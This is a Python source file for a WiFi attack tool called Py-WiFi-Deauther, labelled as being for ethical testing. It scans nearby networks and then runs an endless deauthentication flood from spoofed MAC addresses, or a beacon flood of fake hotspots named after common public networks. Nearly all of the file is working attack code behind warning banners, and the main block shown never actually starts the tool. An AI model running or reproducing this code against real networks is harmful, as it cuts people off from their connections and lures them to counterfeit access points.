#!/usr/bin/env python3
"""
Py-WiFi-Deauther - Ethical WiFi Security Testing Tool
Author: voltsparx
Contact: voltsparx@204

WARNING: This tool is designed for educational purposes and ethical security testing only.
Unauthorized use against any network without explicit permission is illegal.
Use responsibly and only in controlled environments you own or have written permission to test.
"""

import os
import sys
import time
import random
import threading
import subprocess
import argparse
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Beacon, Dot11Elt
import netifaces

# Try to import rich for enhanced UI
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.progress import Progress
    from rich.live import Live
    from rich.text import Text
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False

def random_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))

class PyWiFiDeauther:
    def __init__(self):
        self.attack_active = False
        self.console = Console() if RICH_AVAILABLE else None
        self.packets_sent = 0
        self.interface = None
        self.target_bssid = None
        self.client_bssid = "FF:FF:FF:FF:FF:FF"  # Broadcast by default
        self.deauth_type = "broadcast"
        self.duration = 0
        self.channel = 1
        self.start_time = 0
        self.networks_found = []

    def display_banner(self):
        banner = """
╔══════════════════════════════════════════════════════════════╗
║                 Py-WiFi-Deauther v2.0                        ║
║                 Ethical WiFi Testing Tool                    ║
║                                                              ║
║                 Author: voltsparx                            ║
║                 Contact: voltsparx@204                       ║
╚══════════════════════════════════════════════════════════════╝
        """
        print(banner)

    def display_warning(self):
        warning = """
╔══════════════════════════════════════════════════════════════╗
║                         WARNING                              ║
║══════════════════════════════════════════════════════════════║
║ This tool is for educational and ethical testing purposes    ║
║ only. Unauthorized use against networks you don't own or     ║
║ have explicit permission to test is ILLEGAL.                 ║
║                                                              ║
║ Deauthentication attacks disrupt WiFi service and may        ║
║ violate laws in your jurisdiction.                           ║
║                                                              ║
║ By using this tool, you agree that you are solely            ║
║ responsible for any consequences resulting from its use.     ║
║ The author assumes no liability for misuse of this tool.     ║
╚══════════════════════════════════════════════════════════════╝
        """
        print(warning)
        input("Press Enter to acknowledge this warning and continue...")

    def check_monitor_mode(self, interface):
        """Check if interface is in monitor mode"""
        try:
            result = subprocess.run(['iwconfig', interface], 
                                  capture_output=True, text=True)
            return 'Mode:Monitor' in result.stdout
        except:
            return False

    def set_monitor_mode(self, interface):
        """Set wireless interface to monitor mode"""
        print(f"[+] Setting {interface} to monitor mode...")
        try:
            subprocess.run(['sudo', 'ifconfig', interface, 'down'], check=True)
            subprocess.run(['sudo', 'iwconfig', interface, 'mode', 'monitor'], check=True)
            subprocess.run(['sudo', 'ifconfig', interface, 'up'], check=True)
            print(f"[+] {interface} set to monitor mode successfully")
            return True
        except subprocess.CalledProcessError as e:
            print(f"[!] Failed to set monitor mode: {e}")
            return False

    def get_wifi_interfaces(self):
        """Get available wireless interfaces"""
        interfaces = []
        for interface in netifaces.interfaces():
            if interface.startswith(('wlan', 'wlp', 'wifi')):
                interfaces.append(interface)
        return interfaces

    def select_interface(self):
        """Let user select a wireless interface"""
        interfaces = self.get_wifi_interfaces()
        if not interfaces:
            print("[!] No wireless interfaces found!")
            return None
        print("\nAvailable wireless interfaces:")
        for i, iface in enumerate(interfaces, 1):
            mode = "Monitor" if self.check_monitor_mode(iface) else "Managed"
            print(f"{i}. {iface} ({mode} mode)")
        try:
            choice = int(input("\nSelect interface (number): ")) - 1
            if 0 <= choice < len(interfaces):
                selected = interfaces[choice]
                if not self.check_monitor_mode(selected):
                    if input(f"[?] {selected} is not in monitor mode. Set it? (y/n): ").lower() == 'y':
                        if not self.set_monitor_mode(selected):
                            return None
                return selected
            else:
                print("[!] Invalid selection")
                return None
        except ValueError:
            print("[!] Please enter a valid number")
            return None

    def scan_networks(self, interface, timeout=10):
        """Scan for nearby WiFi networks"""
        print(f"[+] Scanning for networks on {interface} (timeout: {timeout}s)...")
        networks = []
        def packet_handler(pkt):
            if pkt.haslayer(Dot11Beacon):
                ssid = pkt[Dot11Elt].info.decode() if pkt[Dot11Elt].info else "<Hidden>"
                bssid = pkt[Dot11].addr2
                try:
                    channel = int(ord(pkt[Dot11Elt:3].info))
                except Exception:
                    channel = 1
                signal = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else 'N/A'
                if not any(net['bssid'] == bssid for net in networks):
                    networks.append({
                        'ssid': ssid,
                        'bssid': bssid,
                        'channel': channel,
                        'signal': signal
                    })
        sniff(iface=interface, prn=packet_handler, timeout=timeout)
        return networks

    def select_target(self, networks):
        """Let user select a target network"""
        if not networks:
            print("[!] No networks found!")
            return None
        print("\nDiscovered Networks:")
        print("="*80)
        print(f"{'#':<3} {'SSID':<20} {'BSSID':<18} {'Channel':<8} {'Signal':<8}")
        print("="*80)
        for i, net in enumerate(networks, 1):
            ssid_display = net['ssid'][:18] + '..' if len(net['ssid']) > 20 else net['ssid']
            print(f"{i:<3} {ssid_display:<20} {net['bssid']:<18} {net['channel']:<8} {net['signal']:<8}")
        try:
            choice = int(input("\nSelect target network (number): ")) - 1
            if 0 <= choice < len(networks):
                return networks[choice]
            else:
                print("[!] Invalid selection")
                return None
        except ValueError:
            print("[!] Please enter a valid number")
            return None

    def set_channel(self, interface, channel):
        """Set wireless channel"""
        try:
            subprocess.run(['sudo', 'iwconfig', interface, 'channel', str(channel)], 
                         check=True, capture_output=True)
            return True
        except subprocess.CalledProcessError:
            print(f"[!] Failed to set channel {channel}")
            return False

    def deauth_attack(self):
        """Perform deauthentication attack (more powerful version)"""
        print(f"[+] Starting deauthentication attack on {self.target_bssid}")
        if self.deauth_type == "broadcast":
            while self.attack_active:
                src_mac = random_mac()
                packet = RadioTap() / \
                         Dot11(addr1="FF:FF:FF:FF:FF:FF",
                               addr2=src_mac,
                               addr3=self.target_bssid) / \
                         Dot11Deauth(reason=7)
                sendp(packet, iface=self.interface, verbose=False, count=50)
                self.packets_sent += 50
                time.sleep(0.05)
        else:
            while self.attack_active:
                src_mac = random_mac()
                packet_client = RadioTap() / \
                                Dot11(addr1=self.client_bssid,
                                      addr2=src_mac,
                                      addr3=self.target_bssid) / \
                                Dot11Deauth(reason=7)
                packet_ap = RadioTap() / \
                            Dot11(addr1=self.target_bssid,
                                  addr2=src_mac,
                                  addr3=self.target_bssid) / \
                            Dot11Deauth(reason=7)
                sendp([packet_client, packet_ap], iface=self.interface, verbose=False, count=25)
                self.packets_sent += 50
                time.sleep(0.05)

    def beacon_flood(self):
        """Create fake APs to flood the area"""
        print("[+] Starting beacon flood attack...")
        common_ssids = ["Free WiFi", "Airport WiFi", "Hotel Guest", "Starbucks", "Public WiFi",
                       "ATT WiFi", "Xfinity WiFi", "Linksys", "NETGEAR", "TP-Link"]
        while self.attack_active:
            for ssid in common_ssids:
                mac = "02:00:00:%02x:%02x:%02x" % (random.randint(0, 255),
                                                  random.randint(0, 255),
                                                  random.randint(0, 255))
                packet = RadioTap() / \
                         Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
                               addr2=mac, addr3=mac) / \
                         Dot11Beacon(cap="ESS") / \
                         Dot11Elt(ID="SSID", info=ssid) / \
                         Dot11Elt(ID="Rates", info='\x82\x84\x8b\x96\x0c\x12\x18\x24') / \
                         Dot11Elt(ID="DSset", info=chr(self.channel))
                sendp(packet, iface=self.interface, verbose=False, count=1)
                self.packets_sent += 1
            time.sleep(0.5)

    def monitor_attack(self):
        """Monitor and display attack progress"""
        start_time = time.time()
        try:
            while self.attack_active:
                elapsed = time.time() - start_time
                os.system('cls' if os.name == 'nt' else 'clear')
                if RICH_AVAILABLE:
                    table = Table(title="Py-WiFi-Deauther Attack Status", show_header=True)
                    table.add_column("Metric", style="cyan")
                    table.add_column("Value", style="green")
                    table.add_row("Target BSSID", self.target_bssid)
                    table.add_row("Client BSSID", self.client_bssid)
                    table.add_row("Interface", self.interface)
                    table.add_row("Attack Type", self.deauth_type.capitalize())
                    table.add_row("Channel", str(self.channel))
                    table.add_row("Duration", f"{int(elapsed)}s / {self.duration}s")
                    table.add_row("Packets Sent", str(self.packets_sent))
                    table.add_row("Status", "ACTIVE" if self.attack_active else "STOPPED")
                    self.console.print(table)
                else:
                    print("Py-WiFi-Deauther Attack Status")
                    print("="*50)
                    print(f"Target BSSID: {self.target_bssid}")
                    print(f"Client BSSID: {self.client_bssid}")
                    print(f"Interface: {self.interface}")
                    print(f"Attack Type: {self.deauth_type}")
                    print(f"Channel: {self.channel}")
                    print(f"Duration: {int(elapsed)}s / {self.duration}s")
                    print(f"Packets Sent: {self.packets_sent}")
                    print(f"Status: {'ACTIVE' if self.attack_active else 'STOPPED'}")
                    print("="*50)
                if self.duration > 0 and elapsed >= self.duration:
                    self.attack_active = False
                    print("\n[+] Attack completed (duration reached)")
                time.sleep(1)
        except KeyboardInterrupt:
            self.attack_active = False
            print("\n[!] Attack stopped by user")

    def run_attack(self, attack_type):
        """Run the selected attack type"""
        self.attack_active = True
        if not self.set_channel(self.interface, self.channel):
            print("[!] Failed to set channel")
            return
        monitor_thread = threading.Thread(target=self.monitor_attack)
        monitor_thread.daemon = True
        monitor_thread.start()
        try:
            if attack_type == "deauth":
                self.deauth_attack()
            elif attack_type == "beacon":
                self.beacon_flood()
        except Exception as e:
            print(f"[!] Attack error: {e}")
        finally:
            self.attack_active = False
        print(f"\n[+] Attack finished")
        print(f"[+] Total packets sent: {self.packets_sent}")

    def run(self):
        """Main method to run the tool"""
        self.display_banner()
        self.display_warning()
        self.interface = self.select_interface()
        if not self.interface:
            return
        networks = self.scan_networks(self.interface)
        target = self.select_target(networks)
        if not target:
            return
        self.target_bssid = target['bssid']
        self.channel = target['channel']
        print("\nAttack Types:")
        print("1. Deauthentication Attack (disconnect clients)")
        print("2. Beacon Flood (create fake networks)")
        try:
            choice = input("Select attack type (1-2): ").strip()
            if choice == "1":
                attack_type = "deauth"
                target_choice = input("Target specific client? (y/n): ").lower()
                if target_choice == 'y':
                    self.client_bssid = input("Enter client MAC address: ").strip()
                    self.deauth_type = "targeted"
            elif choice == "2":
                attack_type = "beacon"
            else:
                print("[!] Invalid choice")
                return
        except:
            return
        try:
            self.duration = int(input("Attack duration in seconds (0 for unlimited): ") or "30")
        except ValueError:
            self.duration = 30
        print(f"\n[!] ABOUT TO START ATTACK!")
        print(f"Target: {target['ssid']} ({self.target_bssid})")
        print(f"Attack: {attack_type}")
        print(f"Duration: {self.duration}s")
        if input("\nType 'CONFIRM' to start attack: ") != "CONFIRM":
            print("[!] Attack cancelled")
            return
        self.run_attack(attack_type)

def check_dependencies():
    """Check if required tools are installed"""
    required = ['iwconfig', 'ifconfig']
    missing = []
    for tool in required:
        try:
            subprocess.run([tool, '--help'], capture_output=True)
        except FileNotFoundError:
            missing.append(tool)
    return missing

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] This tool requires root privileges. Run with sudo.")
        sys.exit(1)
    missing = check_dependencies()
    if missing:
        print(f"[!] Missing required tools: {', '.join(missing)}")
        print("[!] Install with: sudo apt-get install wireless-tools")
        sys.exit()